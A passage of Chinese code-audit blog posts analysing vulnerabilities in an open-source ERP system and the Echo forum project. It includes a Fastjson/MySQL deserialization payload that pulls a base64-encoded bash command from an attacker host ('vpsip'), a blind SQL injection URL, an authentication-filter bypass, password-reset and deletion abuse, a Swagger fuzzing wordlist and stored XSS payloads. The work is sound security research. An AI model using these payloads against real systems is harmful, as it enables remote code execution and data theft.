queryInfo.setTotal(configResourceManager.counts(apiName, parameterMap));      return returnJson(objectMap, ErpInfo.OK.name, ErpInfo.OK.code);  &#125;

根据路由分析，这里的apiName为user，这样能够寻找到UserComponent里的select方法（下面讲sql注入漏洞的时候会解释为什么是user）
于是我们到该路由下面进行测试

然后去bp的专门板块里面进行查看便可以看到dns请求了，证明漏洞存在
接下来可以进行LDAP注入，但是需要确定AutoType是否开启
可以通过以下代码开启
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

但是在实际测试的过程中，没有开启可以通过mysql服务来打
payload：
&#123;      &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,      &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,      &quot;hostToConnectTo&quot;: &quot;vpsip&quot;,      &quot;portToConnectTo&quot;: 3306,      &quot;info&quot;: &#123;          &quot;user&quot;: &quot;yso_CommonsCollections6_bash -c &#123;echo,xxxxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;,          &quot;password&quot;: &quot;pass&quot;,          &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,          &quot;autoDeserialize&quot;: &quot;true&quot;,          &quot;NUM_HOSTS&quot;: &quot;1&quot;      &#125;,      &quot;databaseToConnectTo&quot;: &quot;dbname&quot;,      &quot;url&quot;: &quot;&quot;  &#125;

参考：蓝帽杯2022决赛 - 赌怪 writeup - KingBridge - 博客园 (cnblogs.com)
这里就不继续测试，大致原理是这样，如果不懂fastjson，请参考：Fastjson姿势技巧集合
依赖log4j
&lt;dependency&gt;      &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;      &lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt;      &lt;version&gt;2.10.0&lt;/version&gt;      &lt;scope&gt;compile&lt;/scope&gt;  &lt;/dependency&gt;

无相关漏洞，可以通过官方文档或者maven仓库中查看：Maven Repository: org.apache.logging.log4j » log4j-to-slf4j (mvnrepository.com)
从配置文件中还得知了用了mybatis框架和swagger
SQL注入

重点关注创建查询的函数如 createQuery()、createSQLQuery()、createNativeQuery()。
定位SQL语句上下文，查看是否有参数直接拼接，是否有对模糊查询关键字的过滤。
是否使用预编译技术，预编译是否完整，关键函数定位setObject()、setInt()、setString()、setSQLXML()关联上下文搜索set*开头的函数。
Mybatis中搜索${}，因为对于like模糊查询、order by排序、范围查询in、动态表名&#x2F;列名，没法使用预编译，只能拼接，所以还是需要手工防注入，此时可查看相关逻辑是否正确。
JPA搜索JpaSort.unsafe()，查看是否用实体之外的字段对查询结果排序，进行了SQL的拼接。以及查看EntityManager的使用，也可能存在拼接SQL的情况。


由于用的是mybatis框架，所以全局搜索关键词$&#123;，然后挑一个进行查看，这里我选的是UserMapperEx.xml下面的

一看like，可能存在SQL注入，优先考虑时间盲注
为了更方便地追踪sql语句地走向，我自己在idea中下了一个插件：Free MyBatis Tool
向上查找，走到了对应地mapper文件：UserMapperEx.java

继续往上找，走到了UserService.java文件

查找select方法的用法，走到了UserComponent.java

继续查找getUserList方法的用法，走到了本类中的select方法

继续找select方法，走到了CommonQueryManager.java

这里为什么可以调用到这里呢？
UserComponent实现了ICommonQuery接口，所以刚刚其实是调用了ICommonQuery接口的select方法，我们看刚才CommonQueryManager的select方法，通过apiName调用的container的getCommonQuery
跟进一下该方法

返回的是一个ICommonQuery类型的值
这里的先调用初始化init方法，遍历service下的组件（每个文件夹下的component类）压入configComponentMap中
后续调用getCommonQuery方法根据传进来的apiName获取对应的service组件（具体apiName跟对应的service组件映射如下：user-&gt;UserComponent）
即service下每个文件夹对应一个apiName，所以这里要调用UserComponent的select方法的话需要apiName为user
解释完后我们继续往上走，走到了ResourceController.java

看到了该方法，我们也就明白了我们所需要的路由是/user/list了，我们知道在该过程中没有对传进来的参数进行任何的检测，所以可以进行sql注入，这里我们用的是时间注入，如下所示：
payload：/user/list?search=%7b%22userName%22%3a%22%22%2c%22loginName%22%3a%22jsh&#39;%20and%20sleep(3)--%2b%22%7d&amp;currentPage=1&amp;pageSize=10
虽然payload中就sleep3秒，但是实际测试的时候其实不止
再来一个布尔盲注的点，可参考文章：深入学习Java代码审计技巧—详细剖析某erp漏洞-先知社区中的sql注入片段
还有很多个点可以自己去尝试
未授权任意访问关于鉴权方面的，我们就是要重点看filter目录下面的文件了，在这里也就是LogCostFilter.java
根据对init方法的分析可知，ignoredUrls为[.css，.js，.jpg，.png，.gif，.ico]，allowUrls为[&#x2F;user&#x2F;login，&#x2F;user&#x2F;registerUser，&#x2F;v2&#x2F;api-docs]
先看verify方法
private static String regexPrefix = &quot;^.*&quot;;private static String regexSuffix = &quot;.*$&quot;;private static boolean verify(List&lt;String&gt; ignoredList, String url) &#123;    for (String regex : ignoredList) &#123;        Pattern pattern = Pattern.compile(regexPrefix + regex + regexSuffix);        Matcher matcher = pattern.matcher(url);        if (matcher.matches()) &#123;            return true;        &#125;    &#125;    return false;&#125;

将ignoredUrls中的逐个元素拼接成正则表达式后与当前url进行匹配，匹配成功即返回true，例如第一个元素形成的正则表达式为^.*.css.*$，即只要包含ignoredUrls中的任意一个元素即可在不登录的情况下访问
在白名单过滤中，只要请求url中以&#x2F;user&#x2F;login、&#x2F;user&#x2F;registerUser、&#x2F;v2&#x2F;api-docs开头即不需要登陆即可访问
然后再看doFilter方法

几个if判断中分别是只要请求url中包含所写的路由，或者是通过verify方法判断，或者是只要以要求的路径开头就可以
这么一看，就是非常的好绕过验证，可以进行路径穿越了
下面给出一个例子

任意重置用户密码在前面进行黑盒测试的过程中，在登录管理员账号的时候发现可以重置任意一个人的密码为初始密码123456，除了管理员本身，并且传参的时候只有一个id

好嘛，来活了，这不就可以尝试未授权任意重置了嘛。id值在现实情况下可以直接库库爆破梭哈了

成功，关于该具体的代码流程可以自己去跟一下，这里就不写了
sql语句如下：
任意添加用户失败想要故技重施的时候却失败了，查看一下具体的代码发现insert的sql语句进行了预编译处理，并且还需要tenantId

也就是说这里增加的时候，对于账号需要JsesssionID，不然插入的时候找不到tenant_id导致最后不知道插入到哪里去
任意删除用户一样的道理

sql查询语句：
&lt;update id=&quot;batDeleteOrUpdateUser&quot;&gt;    update jsh_user    set status=#&#123;status&#125;    where id in (    &lt;foreach collection=&quot;ids&quot; item=&quot;id&quot; separator=&quot;,&quot;&gt;        #&#123;id&#125;    &lt;/foreach&gt;    )&lt;/update

删除成功后数据库数据如下：
相关的sql语句
UPDATE jsh_user SET status = 1 WHERE id IN (&#x27;132&#x27;)

另外，在不使用未授权漏洞进行删除时，sql语句中存在对tenant_id字段的判断，如下sql语句
UPDATE jsh_user SET status = 1 WHERE jsh_user.tenant_id = 63 AND id IN (&#x27;132&#x27;)

任意删除任意客户依旧是一样的道理

后面的deleteType字段是当提示是否强制删除的时候需要用到的，自己也不详讲，自己测一下就知道了
Swagger泄露Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。总体目标是使客户端和文件系统作为服务器以同样的速度来更新。
spring项目中的配置参考：解决 Swagger API 未授权访问漏洞：完善分析与解决方案-阿里云开发者社区 (aliyun.com)
相关路径，在实际测试工程中可用以下字典fuzz
/api/api-docs/api-docs/swagger.json/api.html/api/api-docs/api/apidocs/api/doc/api/swagger/api/swagger-ui/api/swagger-ui.html/api/swagger-ui.html//api/swagger-ui.json/api/swagger.json/api/swagger//api/swagger/ui/api/swagger/ui//api/swaggerui/api/swaggerui//api/v1//api/v1/api-docs/api/v1/apidocs/api/v1/swagger/api/v1/swagger-ui/api/v1/swagger-ui.html/api/v1/swagger-ui.json/api/v1/swagger.json/api/v1/swagger//api/v2/api/v2/api-docs/api/v2/apidocs/api/v2/swagger/api/v2/swagger-ui/api/v2/swagger-ui.html/api/v2/swagger-ui.json/api/v2/swagger.json/api/v2/swagger//api/v3/apidocs/apidocs/swagger.json/doc.html/docs//druid/index.html/graphql/libs/swaggerui/libs/swaggerui//spring-security-oauth-resource/swagger-ui.html/spring-security-rest/api/swagger-ui.html/sw/swagger-ui.html/swagger/swagger-resources/swagger-resources/configuration/security/swagger-resources/configuration/security//swagger-resources/configuration/ui/swagger-resources/configuration/ui//swagger-ui/swagger-ui.html/swagger-ui.html#/api-memory-controller/swagger-ui.html//swagger-ui.json/swagger-ui/swagger.json/swagger.json/swagger.yml/swagger//swagger/index.html/swagger/static/index.html/swagger/swagger-ui.html/swagger/ui//Swagger/ui/index/swagger/ui/index/swagger/v1/swagger.json/swagger/v2/swagger.json/template/swagger-ui.html/user/swagger-ui.html/user/swagger-ui.html//v1.x/swagger-ui.html/v1/api-docs/v1/swagger.json/v2/api-docs/v3/api-docs

现在看一手关于它的配置文件Swagger2Config.java
@Configuration@EnableSwagger2public class Swagger2Config &#123;    @Bean    public Docket createRestApi() &#123;        return new Docket(DocumentationType.SWAGGER_2)                .apiInfo(this.apiInfo())                .select()                .apis(RequestHandlerSelectors.any())                .paths(PathSelectors.any())                .build();    &#125;    private ApiInfo apiInfo() &#123;        return new ApiInfoBuilder()                .title(&quot;Mybatis-Plus Plugin Example RESTful APIs&quot;)                .description(&quot;集成Mybatis-Plus模块接口描述&quot;)                .termsOfServiceUrl(&quot;http://127.0.0.1&quot;)                .contact(new Contact(&quot;jishenghua&quot;, &quot;&quot;, &quot;&quot;))                .version(&quot;2.1.1&quot;)                .build();    &#125;&#125;

在该类及配置文件中未进行任何的限制及访问控制和身份验证，另外在filter中也未进行身份判断，因此导致在未登录的情况下能够请求得到api接口

修复

限制生成文档的请求处理程序：使用适当的 RequestHandlerSelectors 来选择只包含需要公开的接口，而不是使用 RequestHandlerSelectors.any()。
限制生成文档的路径：使用适当的 PathSelectors 来选择只包含需要公开的路径，而不是使用 PathSelectors.any()。
添加访问控制和身份验证：确保只有授权用户能够访问 Swagger API 文档。这可以通过配置身份验证和授权机制来实现，例如基于角色或令牌的访问控制。
定期审查和更新配置：定期审查 Swagger API 文档的配置，确保其与应用程序的安全需求保持一致，并经常更新以反映最新的安全要求。

账号密码泄露还是filter那边没有写好导致可以任意访问

XSS关键字：
&lt;%=$&#123;&lt;c:out&lt;c:if&lt;c:forEachModelAndViewModelMapModelrequest.getParameterrequest.setAttribute

在jsp文件中，使用&lt;c:out&gt;标签是直接对代码进行输出而不当成js代码执行
在使用thymeleaf 模板进行渲染时，模板自带有字符转义的功能

th:text 进行文本替换 不会解析html
th:utext 进行文本替换 会解析html

以下例子中没有使用渲染模板，最好从前端界面入手，寻找可能的插入点，然后对后端代码进行分析
存储型XSS一般分为两个部分：

将攻击向量通过某个接口存入
将数据库中的攻击向量通过某个接口显示在页面中

存入点分析：
根据&#x2F;supplier&#x2F;update找到对应的Controller，在ResourceController.java中
@PostMapping(value = &quot;/&#123;apiName&#125;/update&quot;, produces = &#123;&quot;application/javascript&quot;, &quot;application/json&quot;&#125;)public String updateResource(@PathVariable(&quot;apiName&quot;) String apiName,                             @RequestParam(&quot;info&quot;) String beanJson,                             @RequestParam(&quot;id&quot;) Long id, HttpServletRequest request)throws Exception &#123;    Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();    // 这里    int update = configResourceManager.update(apiName, beanJson, id, request);    if(update &gt; 0) &#123;        return returnJson(objectMap, ErpInfo.OK.name, ErpInfo.OK.code);    &#125; else if(update == -1) &#123;        return returnJson(objectMap, ErpInfo.TEST_USER.name, ErpInfo.TEST_USER.code);    &#125; else &#123;        return returnJson(objectMap, ErpInfo.ERROR.name, ErpInfo.ERROR.code);    &#125;&#125;

找到对应的处理方法
@Transactional(value = &quot;transactionManager&quot;, rollbackFor = Exception.class)public int update(String apiName, String beanJson, Long id, HttpServletRequest request)throws Exception &#123;    if (StringUtil.isNotEmpty(apiName)) &#123;        return container.getCommonQuery(apiName).update(beanJson, id, request);    &#125;    return 0;&#125;

还是一样，找到SupplierComponent.java类中的update方法
@Overridepublic int update(String beanJson, Long id, HttpServletRequest request)throws Exception &#123;    return supplierService.updateSupplier(beanJson, id, request);&#125;

来到SupplierService.java层
@Transactional(value = &quot;transactionManager&quot;, rollbackFor = Exception.class)public int updateSupplier(String beanJson, Long id, HttpServletRequest request)throws Exception &#123;    Supplier supplier = JSONObject.parseObject(beanJson, Supplier.class);    if(supplier.getBeginNeedPay() == null) &#123;        supplier.setBeginNeedPay(BigDecimal.ZERO);    &#125;    if(supplier.getBeginNeedGet() == null) &#123;        supplier.setBeginNeedGet(BigDecimal.ZERO);    &#125;    supplier.setId(id);    int result=0;    try&#123;        // 这里        result=supplierMapper.updateByPrimaryKeySelective(supplier);        logService.insertLog(&quot;商家&quot;,                             new StringBuffer(BusinessConstants.LOG_OPERATION_TYPE_EDIT).append(supplier.getSupplier()).toString(), request);    &#125;catch(Exception e)&#123;        JshException.writeFail(logger, e);    &#125;    return result;&#125;

成功找到对应的Mapper，即SupplierMapper，并且操作id为updateByPrimaryKeySelective，在相应的xml文件中找到更新的sql语句
&lt;update id=&quot;updateByPrimaryKeySelective&quot; parameterType=&quot;com.jsh.erp.datasource.entities.Supplier&quot;&gt;    update jsh_supplier    &lt;set&gt;        &lt;if test=&quot;supplier != null&quot;&gt;            supplier = #&#123;supplier,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;contacts != null&quot;&gt;            contacts = #&#123;contacts,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;phoneNum != null&quot;&gt;            phone_num = #&#123;phoneNum,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;email != null&quot;&gt;            email = #&#123;email,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;description != null&quot;&gt;            description = #&#123;description,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;isystem != null&quot;&gt;            isystem = #&#123;isystem,jdbcType=TINYINT&#125;,        &lt;/if&gt;        &lt;if test=&quot;type != null&quot;&gt;            type = #&#123;type,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;enabled != null&quot;&gt;            enabled = #&#123;enabled,jdbcType=BIT&#125;,        &lt;/if&gt;        &lt;if test=&quot;advanceIn != null&quot;&gt;            advance_in = #&#123;advanceIn,jdbcType=DECIMAL&#125;,        &lt;/if&gt;        &lt;if test=&quot;beginNeedGet != null&quot;&gt;            begin_need_get = #&#123;beginNeedGet,jdbcType=DECIMAL&#125;,        &lt;/if&gt;        &lt;if test=&quot;beginNeedPay != null&quot;&gt;            begin_need_pay = #&#123;beginNeedPay,jdbcType=DECIMAL&#125;,        &lt;/if&gt;        &lt;if test=&quot;allNeedGet != null&quot;&gt;            all_need_get = #&#123;allNeedGet,jdbcType=DECIMAL&#125;,        &lt;/if&gt;        &lt;if test=&quot;allNeedPay != null&quot;&gt;            all_need_pay = #&#123;allNeedPay,jdbcType=DECIMAL&#125;,        &lt;/if&gt;        &lt;if test=&quot;fax != null&quot;&gt;            fax = #&#123;fax,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;telephone != null&quot;&gt;            telephone = #&#123;telephone,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;address != null&quot;&gt;            address = #&#123;address,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;taxNum != null&quot;&gt;            tax_num = #&#123;taxNum,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;bankName != null&quot;&gt;            bank_name = #&#123;bankName,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;accountNumber != null&quot;&gt;            account_number = #&#123;accountNumber,jdbcType=VARCHAR&#125;,        &lt;/if&gt;        &lt;if test=&quot;taxRate != null&quot;&gt;            tax_rate = #&#123;taxRate,jdbcType=DECIMAL&#125;,        &lt;/if&gt;        &lt;if test=&quot;tenantId != null&quot;&gt;            tenant_id = #&#123;tenantId,jdbcType=BIGINT&#125;,        &lt;/if&gt;        &lt;if test=&quot;deleteFlag != null&quot;&gt;            delete_flag = #&#123;deleteFlag,jdbcType=VARCHAR&#125;,        &lt;/if&gt;    &lt;/set&gt;    where id = #&#123;id,jdbcType=BIGINT&#125;&lt;/update&gt;

这整条数据流就是将攻击向量存入数据库的过程，中间的方法为进行任何的过滤，filter层也没有对输入进行过滤。
现在需要触发xss，只需要将相关参数显示在界面中即可。
读取点分析：
读取supplier还有另一个api，根据前端观察可以知道为&#x2F;supplier&#x2F;list
同样在
@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)public String getList(@PathVariable(&quot;apiName&quot;) String apiName,                      @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,                      @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,                      @RequestParam(value = Constants.SEARCH, required = false) String search,                      HttpServletRequest request)throws Exception &#123;    Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);    parameterMap.put(Constants.SEARCH, search);    PageQueryInfo queryInfo = new PageQueryInfo();    Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();    if (pageSize != null &amp;&amp; pageSize &lt;= 0) &#123;        pageSize = 10;    &#125;    String offset = ParamUtils.getPageOffset(currentPage, pageSize);    if (StringUtil.isNotEmpty(offset)) &#123;        parameterMap.put(Constants.OFFSET, offset);    &#125;    // 这里    List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);    // 会将查询到的参数放在map的page参数中    objectMap.put(&quot;page&quot;, queryInfo);    if (list == null) &#123;        queryInfo.setRows(new ArrayList&lt;Object&gt;());        queryInfo.setTotal(BusinessConstants.DEFAULT_LIST_NULL_NUMBER);        return returnJson(objectMap, &quot;查找不到数据&quot;, ErpInfo.OK.code);    &#125;    queryInfo.setRows(list);    queryInfo.setTotal(configResourceManager.counts(apiName, parameterMap));    return returnJson(objectMap, ErpInfo.OK.name, ErpInfo.OK.code);&#125;

和上述分析过程一致，得到查询语句
&lt;select id=&quot;selectByConditionSupplier&quot; parameterType=&quot;com.jsh.erp.datasource.entities.SupplierExample&quot; resultMap=&quot;com.jsh.erp.datasource.mappers.SupplierMapper.BaseResultMap&quot;&gt;    select *    FROM jsh_supplier    where 1=1    &lt;if test=&quot;supplier != null&quot;&gt;        and supplier like &#x27;%$&#123;supplier&#125;%&#x27;    &lt;/if&gt;    &lt;if test=&quot;type != null&quot;&gt;        and type=&#x27;$&#123;type&#125;&#x27;    &lt;/if&gt;    &lt;if test=&quot;phonenum != null&quot;&gt;        and phone_num like &#x27;%$&#123;phonenum&#125;%&#x27;    &lt;/if&gt;    &lt;if test=&quot;telephone != null&quot;&gt;        and telephone like &#x27;%$&#123;telephone&#125;%&#x27;    &lt;/if&gt;    &lt;if test=&quot;description != null&quot;&gt;        and description like &#x27;%$&#123;description&#125;%&#x27;    &lt;/if&gt;    and ifnull(delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;    order by id desc    &lt;if test=&quot;offset != null and rows != null&quot;&gt;        limit #&#123;offset&#125;,#&#123;rows&#125;    &lt;/if&gt;&lt;/select&gt;

这将数据库中的全部字段结果返回，最后封装在json的page参数中
现在需要寻找将这些结果渲染到前端页面的html文件，使用ajax必定会对响应的路由发起请求，搜索&#x2F;supplier&#x2F;list
在supplier.js文件中
function showSupplierDetails(pageNo,pageSize) &#123;    var supplier = $.trim($(&quot;#searchSupplier&quot;).val());    var phonenum = $.trim($(&quot;#searchPhonenum&quot;).val());    var telephone = $.trim($(&quot;#searchTelephone&quot;).val());    var description = $.trim($(&quot;#searchDesc&quot;).val());    $.ajax(&#123;        type:&quot;get&quot;,        url: &quot;/supplier/list&quot;,        dataType: &quot;json&quot;,        data: (&#123;            search: JSON.stringify(&#123;                supplier: supplier,                type: listType,                phonenum: phonenum,                telephone: telephone,                description: description            &#125;),            currentPage: pageNo,            pageSize: pageSize        &#125;),        success: function (res) &#123;            if(res &amp;&amp; res.code === 200)&#123;                if(res.data &amp;&amp; res.data.page) &#123;                    $(&quot;#tableData&quot;).datagrid(&#x27;loadData&#x27;, res.data.page);                &#125;            &#125;        &#125;,        //此处添加错误处理        error:function() &#123;            $.messager.alert(&#x27;查询提示&#x27;,&#x27;查询数据后台异常，请稍后再试！&#x27;,&#x27;error&#x27;);            return;        &#125;    &#125;);&#125;

这里对相应的url发起请求，并将其渲染至id为tableData的标签中
寻找调用showSupplierDetails方法的地方，与之匹配的是同文件的initTableData方法，在该方法中，只显示了如下参数
columns:[[    &#123; field: &#x27;id&#x27;,width:35,align:&quot;center&quot;,checkbox:true&#125;,    &#123; title: &#x27;操作&#x27;,field: &#x27;op&#x27;,align:&quot;center&quot;,width:60,     formatter:function(value,rec,index) &#123;         var str = &#x27;&#x27;;         str += &#x27;&lt;img title=&quot;编辑&quot; src=&quot;/js/easyui/themes/icons/pencil.png&quot; style=&quot;cursor: pointer;&quot; onclick=&quot;editSupplier(\&#x27;&#x27; + index + &#x27;\&#x27;);&quot;/&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#x27;;         if(isShowOpFun()) &#123;             str += &#x27;&lt;img title=&quot;删除&quot; src=&quot;/js/easyui/themes/icons/edit_remove.png&quot; style=&quot;cursor: pointer;&quot; onclick=&quot;deleteSupplier(\&#x27;&#x27; + rec.id + &#x27;\&#x27;);&quot;/&gt;&#x27;;         &#125;         return str;     &#125;    &#125;,    &#123; title: &#x27;名称&#x27;,field: &#x27;supplier&#x27;,width:150&#125;,    &#123; title: &#x27;联系人&#x27;, field: &#x27;contacts&#x27;,width:50,align:&quot;center&quot;&#125;,    &#123; title: &#x27;手机号码&#x27;, field: &#x27;telephone&#x27;,width:100,align:&quot;center&quot;&#125;,    &#123; title: &#x27;电子邮箱&#x27;,field: &#x27;email&#x27;,width:80,align:&quot;center&quot;&#125;,    &#123; title: &#x27;联系电话&#x27;, field: &#x27;phoneNum&#x27;,width:100,align:&quot;center&quot;&#125;,    &#123; title: &#x27;传真&#x27;, field: &#x27;fax&#x27;,width:100,align:&quot;center&quot;&#125;,    &#123; title: &#x27;预付款&#x27;,field: &#x27;advanceIn&#x27;,width:70,align:&quot;center&quot;&#125;,    &#123; title: &#x27;期初应收&#x27;,field: &#x27;beginNeedGet&#x27;,width:70,align:&quot;center&quot;&#125;,    &#123; title: &#x27;期初应付&#x27;,field: &#x27;beginNeedPay&#x27;,width:70,align:&quot;center&quot;&#125;,    &#123; title: &#x27;期末应收&#x27;,field: &#x27;allNeedGet&#x27;,width:70,align:&quot;center&quot;&#125;,    &#123; title: &#x27;期末应付&#x27;,field: &#x27;allNeedPay&#x27;,width:70,align:&quot;center&quot;&#125;,    &#123; title: &#x27;税率(%)&#x27;, field: &#x27;taxRate&#x27;,width:60,align:&quot;center&quot;&#125;,    &#123; title: &#x27;状态&#x27;,field: &#x27;enabled&#x27;,width:70,align:&quot;center&quot;,formatter:function(value)&#123;        return value? &quot;&lt;span style=&#x27;color:green&#x27;&gt;启用&lt;/span&gt;&quot;:&quot;&lt;span style=&#x27;color:red&#x27;&gt;禁用&lt;/span&gt;&quot;;    &#125;&#125;]]

因此，在插入攻击向量时，需要在显示的参数中进行选择，当然还需要考虑前端的js过滤。
调用initTableData方法的地方，在supplier.js中
//初始化界面$(function() &#123;    var listTitle = &quot;&quot;; //单据标题    var listType = &quot;&quot;; //类型    var listTypeEn = &quot;&quot;; //英文类型    getType();    initTableData();    ininPager();    bindEvent();&#125;);

这个在引入js时即会调用，全局搜索引入supplier.js的地方

在customer.html文件中找到了id为tableData的table
&lt;table id=&quot;tableData&quot; style=&quot;top:300px;border-bottom-color:#FFFFFF&quot;&gt;&lt;/table&gt;

整个流程到这里结束
测试
触发界面

抓包

后台执行的SQL语句
UPDATE jsh_supplier SET supplier = &#x27;客户1&#x27;, contacts = &#x27;小李&#x27;, phone_num = &#x27;12345678&#x27;, email = &#x27;&#x27;, description = &#x27;&lt;script&gt;alert(\&#x27;desc\&#x27;)&lt;/script&gt;&#x27;, type = &#x27;客户&#x27;, enabled = 1, begin_need_get = &#x27;0&#x27;, begin_need_pay = &#x27;0&#x27;, all_need_get = &#x27;80&#x27;, fax = &#x27;&#x27;, telephone = &#x27;&#x27;, address = &#x27;&lt;script&gt;alert(\&#x27;address\&#x27;)&lt;/script&gt;&#x27;, tax_num = &#x27;&#x27;, bank_name = &#x27;&#x27;, account_number = &#x27;&#x27;, tax_rate = &#x27;12&#x27; WHERE jsh_supplier.tenant_id = 63 AND id = 58

刷新界面触发XSS弹窗

还有很多其他点就不一一列举了
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计-Echo2.3</title>
    <url>/2025/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Echo2-3/</url>
    <content><![CDATA[前言本文先发于先知社区：代码审计-Echo2.3-先知社区
项目介绍开源社区系统：基于 SpringBoot + MyBatis + MySQL + Redis + Kafka + Elasticsearch + Spring Security + … 并提供详细的开发文档和配套教程。包含帖子、评论、私信、系统通知、点赞、关注、搜索、用户设置、数据统计等模块。3000+Star的项目还是比较不错的
项目地址：https://gitee.com/veal98/Echo
环境搭建JDK 1.8.0_65Maven 3.9.9redis 3.0.504zookeeper 3.6.4kafka 2.12-3.5.1Elasticsearch 6.4.3

redis的安装较为简单，这里就不介绍了
对于zookeeper和kafka来说，两个是配套使用的，并且kafka就已经内置了适配的zookeeper了，不需要我们自己再去单独下载安装，要不然你还要考虑两个版本适不适配（吃了大亏。。。）
这里直接贴链接：https://www.cnblogs.com/Marydon20170307/p/17933358.html
对于Elasticsearch的安装可参考：https://zhuanlan.zhihu.com/p/451571598
但是有点不同的是，对于我自己来说，我在conf\elasticsearch.yml文件中还要多添加一点，如下：
http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;network.host: 127.0.0.1xpack.ml.enabled: false

如上配置之后就可以正常使用了，就是多关闭了机器学习的功能
注：启动项目之前上面这些基础配置都要开启来
接下来我们需要先把该项目的源码下下来，然后对src&#x2F;main&#x2F;resources&#x2F;application-develop.properties文件进行一部分的修改
spring.datasource.url = jdbc:mysql://127.0.0.1:3306/数据库名?characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=Hongkongspring.datasource.username = 自己的账号名spring.datasource.password = 自己的密码......# Elasticsearchspring.data.elasticsearch.cluster-name = 该字段见 Elasticsearch 安装包中的 elasticsearch.yml的cluster-namespring.data.elasticsearch.cluster-nodes = 127.0.0.1:9300

其他配置要是你的redis那些配置都保持默认的话那么也不需要进行更改
然后我们还需要创建数据库并将提供的sql文件全部导入进去，最后导入完后的结果如下：
最后就是启动springboot，访问我们设定的对应端口

审计由于第一次审计java项目木有经验，再加上这是个小项目，代码量也不能算很多，所以我是全部的文件都看了一遍
首先该项目里面是不存在sql注入漏洞的，这是因为所有的输入点都进行了预编译处理，都用#&#123;&#125;进行了处理

碰壁1无妨，继续审计，看到了一个有趣的地方，位于UserController.java文件中
/** * 更新图像路径（将本地的图像路径更新为云服务器上的图像路径） * @param fileName * @return */@PostMapping(&quot;/header/url&quot;)@ResponseBodypublic String updateHeaderUrl(String fileName) &#123;    if (StringUtils.isBlank(fileName)) &#123;        return CommunityUtil.getJSONString(1, &quot;文件名不能为空&quot;);    &#125;    // 文件在云服务器上的的访问路径    String url = headerBucketUrl + &quot;/&quot; + fileName;    userService.updateHeader(hostHolder.getUser().getId(), url);    return CommunityUtil.getJSONString(0);&#125;

方法是直接读取了云服务器上面的图像文件当作了头像，虽然说对最后的文件路径进行了处理，无法控制
这时我就想着上传图片的方法有没有设置检验图片内容啥的，该方法如下：
@GetMapping(&quot;/setting&quot;)public String getSettingPage(Model model) &#123;    // 生成上传文件的名称    String fileName = CommunityUtil.generateUUID();    model.addAttribute(&quot;fileName&quot;, fileName);    // 设置响应信息(qiniu 的规定写法)    StringMap policy = new StringMap();    policy.put(&quot;returnBody&quot;, CommunityUtil.getJSONString(0));    // 生成上传到 qiniu 的凭证(qiniu 的规定写法)    Auth auth = Auth.create(accessKey, secretKey);    String uploadToken = auth.uploadToken(headerBucketName, fileName, 3600, policy);    model.addAttribute(&quot;uploadToken&quot;, uploadToken);    return &quot;/site/setting&quot;;&#125;

没有对上传的文件进行任何检验，也就是说我们可以上传任意文件，所以我尝试上传一个xss文件，但很遗憾的是无法触发，查了一下才发现该链接是通过&lt;img&gt;标签进行的加载，浏览器会将 HTML 文件当作图片解析（显示破损图标），所以无法触发成功（忘了这茬。。。）
绕过鉴权继续审计，在LoginTicketInterceptor.java中有一个preHandle方法存在漏洞
@Overridepublic boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;    // 从 cookie 中获取凭证    String ticket = CookieUtil.getValue(request, &quot;ticket&quot;);    if (ticket != null) &#123;        // 查询凭证        LoginTicket loginTicket = userService.findLoginTicket(ticket);        // 检查凭证状态（是否有效）以及是否过期        if (loginTicket != null &amp;&amp; loginTicket.getStatus() == 0 &amp;&amp; loginTicket.getExpired().after(new Date())) &#123;            // 根据凭证查询用户            User user = userService.findUserById(loginTicket.getUserId());            // 在本次请求中持有用户信息            hostHolder.setUser(user);            // 构建用户认证的结果，并存入 SecurityContext, 以便于 Spring Security 进行授权            Authentication authentication = new UsernamePasswordAuthenticationToken(                    user, user.getPassword(), userService.getAuthorities(user.getId())            );            SecurityContextHolder.setContext(new SecurityContextImpl(authentication));        &#125;    &#125;    return true;&#125;

对于spring框架熟悉都知道，该类实现了HandlerInterceptor接口，其preHandle方法在每一次请求的过程中都会执行一遍
HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Controller

而该方法只对ticket有值的时候进行鉴权，对于ticket值为null的时候没有进行任何处理，直接返回true，所以我们便可以轻松绕过鉴权了，具体如何使用会配合下面的漏洞进行
